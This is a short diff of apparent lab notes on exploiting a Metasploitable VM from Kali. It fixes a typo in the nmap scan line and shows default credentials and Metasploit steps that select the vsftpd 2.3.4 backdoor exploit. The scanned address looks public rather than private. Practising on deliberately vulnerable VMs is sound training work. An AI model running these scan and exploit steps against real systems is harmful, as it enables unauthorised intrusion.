@@ -4,7 +4,7 @@ github.com/rampriyakilar/ice-needs
 -after download & open in vmworkstation
 -Enter username & pass : msfadmin
 -close that meta & open kali
--map-v -A 193.168.23.129
+-nmap-v -A 193.168.23.129
 -msf console
 -search vsftpd
 -use exploit/unix/ftp/vsftpd_234_backdoor
